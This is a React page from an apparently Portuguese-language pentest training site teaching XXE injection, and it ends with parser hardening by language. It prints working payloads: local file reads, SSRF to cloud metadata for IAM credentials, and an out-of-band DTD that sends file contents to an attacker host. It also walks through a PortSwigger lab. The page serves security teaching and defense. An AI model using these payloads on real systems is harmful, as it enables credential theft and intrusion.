import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function XXE() {
  return (
    <PageContainer
      title="XXE — XML External Entity Injection"
      subtitle="Abuso de entidades externas em parsers XML: leitura de arquivo, SSRF, XXE cego por OOB com DTD externo, error-based, XInclude e XXE via upload (SVG, DOCX). Mais a defesa que realmente fecha por parser."
      difficulty="avancado"
      timeToRead="26 min"
    >
      <AlertBox type="danger" title="OWASP A05:2021 — Security Misconfiguration (ex-A4 XXE)">
        XXE aparece quando um parser XML processa <strong>entidades externas</strong> em documento
        controlável pelo atacante. Com uma única <code>&lt;!ENTITY&gt;</code> dá para ler
        <code>/etc/passwd</code>, bater no metadata da cloud (SSRF), varrer a rede interna e, em
        parsers antigos, até RCE via <code>expect://</code>. O ponto de entrada favorito hoje são
        APIs e uploads que aceitam XML por baixo dos panos (SVG, DOCX, XLSX, SAML, SOAP).
      </AlertBox>

      <h2>O básico — entidade, DTD e a linha que abre tudo</h2>
      <p>
        Uma <strong>entidade</strong> em XML é um atalho: <code>&amp;nome;</code> é substituído
        pelo valor definido no <strong>DTD</strong> (<em>Document Type Definition</em>). Uma
        entidade <strong>externa</strong> aponta para um recurso fora do documento com
        <code>SYSTEM</code>. Se o parser resolve isso, ele busca o recurso — arquivo local,
        URL, o que for — e coloca o conteúdo dentro da resposta.
      </p>
      <CodeBlock
        language="xml"
        code={`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<produto><nome>&xxe;</nome></produto>`}
      />

      <h2>Passo 1 — XXE clássico: ler arquivo</h2>
      <p>
        Ache um endpoint que recebe XML (Burp mostra <code>Content-Type: application/xml</code> ou
        <code>text/xml</code>) e cujo valor de algum campo <strong>volta refletido</strong> na
        resposta. Injete a entidade e aponte o campo refletido para ela:
      </p>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) request normal do app (checagem de estoque por XML)",
            cmd: "curl -s http://alvo/product/stock -H 'Content-Type: application/xml' --data '<stockCheck><productId>1</productId></stockCheck>'",
            out: `<stockStatus>412 unidades</stockStatus>`,
            outType: "muted",
          },
          {
            comment: "2) injeta entidade e aponta productId pra ela",
            cmd: "curl -s http://alvo/product/stock -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><stockCheck><productId>&xxe;</productId></stockCheck>'",
            out: `Invalid product ID: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...`,
            outType: "error",
          },
        ]}
      />
      <AlertBox type="info" title="O campo certo pra injetar">
        Escolha o campo cujo valor <strong>reaparece</strong> na resposta (mensagem de erro,
        confirmação, eco). Se nada volta, é XXE <strong>cego</strong> — pule para o Passo 3.
      </AlertBox>

      <h2>Passo 2 — XXE para SSRF (o mais valioso em cloud)</h2>
      <p>
        Troque o <code>file://</code> por uma URL interna. Em AWS/GCP/Azure isso vira roubo de
        credencial no endpoint de metadata:
      </p>
      <CodeBlock
        language="xml"
        code={`<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>

<!-- pega o role e depois: .../security-credentials/NOME-DO-ROLE
     => AccessKeyId, SecretAccessKey e Token temporario da instancia -->`}
      />

      <h2>Passo 3 — XXE cego por OOB (out-of-band) com DTD externo</h2>
      <p>
        Sem reflexo na resposta, force o servidor a te <strong>chamar de volta</strong>. Você
        hospeda um DTD malicioso no seu host; o alvo baixa o DTD, lê o arquivo local e exfiltra o
        conteúdo embutido numa URL para você. Isso contorna a regra de que parâmetro de entidade
        (<code>%</code>) não pode ser usado dentro da mesma declaração.
      </p>
      <CodeBlock
        language="xml"
        code={`<!-- 1) no SEU servidor: http://10.10.14.7/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.7/?x=%file;'>">
%eval;
%exfil;`}
      />
      <CodeBlock
        language="xml"
        code={`<!-- 2) payload enviado ao alvo: so puxa o DTD externo -->
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % remoto SYSTEM "http://10.10.14.7/evil.dtd"> %remoto; ]>
<stockCheck><productId>1</productId></stockCheck>`}
      />
      <Terminal
        path="~"
        lines={[
          {
            comment: "3) no seu host, um servidor simples captura o callback",
            cmd: "python3 -m http.server 80",
            out: `Serving HTTP on 0.0.0.0 port 80 ...\n10.0.5.14 - - [04/Aug/2026 14:03:11] \"GET /evil.dtd HTTP/1.1\" 200 -\n10.0.5.14 - - [04/Aug/2026 14:03:11] \"GET /?x=ip-10-0-5-14 HTTP/1.1\" 200 -`,
            outType: "error",
          },
        ]}
      />
      <AlertBox type="warning" title="Quando nem o OOB volta o conteúdo">
        Se firewall de saída bloqueia HTTP externo, use <strong>error-based</strong>: faça a
        entidade apontar para um caminho inexistente montado com o conteúdo do arquivo; a mensagem
        de erro do parser vaza o valor. Troque a última linha do DTD por
        <code>{`<!ENTITY % err "<!ENTITY content SYSTEM 'file:///naoexiste/%file;'>">`}</code>.
      </AlertBox>

      <h2>Passo 4 — vetores alternativos</h2>
      <CommandTable
        title="Onde mais cabe XXE"
        variations={[
          { cmd: "XInclude", desc: "Sem controle do DOCTYPE inteiro, mas o app embute seu dado num XML do servidor", output: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` },
          { cmd: "Upload de SVG", desc: "Avatar/imagem que aceita SVG — SVG é XML; o processador (ImageMagick/rsvg) resolve a entidade", output: `<svg><text>&xxe;</text></svg> com DOCTYPE + ENTITY no topo` },
          { cmd: "DOCX / XLSX", desc: "Office é zip de XML. Injete no document.xml, rezipe e envie ao endpoint que faz parse", output: `edite word/document.xml, adicione DOCTYPE com ENTITY externo` },
          { cmd: "SOAP / SAML", desc: "Envelopes XML de autenticação são alvo clássico de XXE e de assinatura mal validada", output: `injetar DOCTYPE antes do <soap:Envelope>` },
          { cmd: "expect:// (PHP)", desc: "Se a extensão PHP expect estiver ativa, vira RCE direto (raro, mas mortal)", output: `<!ENTITY xxe SYSTEM "expect://id">` },
        ]}
      />

      <AlertBox type="warning" title="Billion Laughs — DoS por entidade recursiva">
        Entidades que se referenciam em cascata explodem a memória do parser (uma string vira
        bilhões de caracteres). Não vaza dado, mas derruba o serviço — use com cautela e só com
        autorização explícita, pois é destrutivo.
      </AlertBox>

      <h2>Ferramentas</h2>
      <CommandTable
        title="Automação e apoio"
        variations={[
          { cmd: "Burp Scanner", desc: "Detecta XXE reflexivo e OOB usando o Collaborator como endpoint de callback" },
          { cmd: "XXEinjector", desc: "Ruby; automatiza leitura de arquivo, OOB e brute de caminhos (ruby XXEinjector.rb --host=... --file=...)" },
          { cmd: "Collaborator / interactsh", desc: "Recebe o callback OOB quando você não tem IP público; interactsh-client gera o domínio" },
        ]}
      />

      <PracticeBox
        title="Lab PortSwigger — XXE para ler /etc/passwd"
        goal="No lab 'Exploiting XXE using external entities to retrieve files', ler /etc/passwd via o recurso de checagem de estoque, que aceita XML."
        command={`# 1) manda o productId normal ao Burp Repeater e observa o XML
POST /product/stock
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

# 2) injeta a entidade e aponta productId pra ela
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>`}
        expected={`Invalid product ID: root:x:0:0:root:/root:/bin/bash ...`}
        verify="A mensagem de erro devolve o conteúdo de /etc/passwd e o lab vira 'Solved'."
      />

      <h2>Defesa — desligar entidade externa por parser</h2>
      <p>
        A correção real é sempre a mesma: <strong>desabilitar DOCTYPE / entidades externas</strong>
        no parser. Como fazer muda por linguagem:
      </p>
      <CommandTable
        title="Hardening por stack"
        variations={[
          { cmd: "Java (DocumentBuilderFactory)", desc: "setFeature('http://apache.org/xml/features/disallow-doctype-decl', true)" },
          { cmd: "Java (SAX/XMLReader)", desc: "desabilitar external-general-entities e external-parameter-entities" },
          { cmd: "Python (lxml)", desc: "etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)" },
          { cmd: "Python (defusedxml)", desc: "Trocar xml.etree por defusedxml — bloqueia XXE e billion laughs por padrão" },
          { cmd: ".NET", desc: "XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit" },
          { cmd: "PHP (libxml < 2.9)", desc: "libxml_disable_entity_loader(true) — em libxml >= 2.9 já vem seguro por padrão" },
        ]}
      />
      <AlertBox type="danger" title="No relatório">
        XXE reflexivo com leitura de <code>/etc/passwd</code> já é <strong>HIGH</strong>; XXE que
        alcança metadata de cloud e rouba credencial IAM é <strong>CRITICAL</strong>. Entregue PoC
        mínimo (conteúdo de um arquivo não-sensível ou o callback OOB) e não rode billion laughs
        em produção.
      </AlertBox>
    </PageContainer>
  );
}
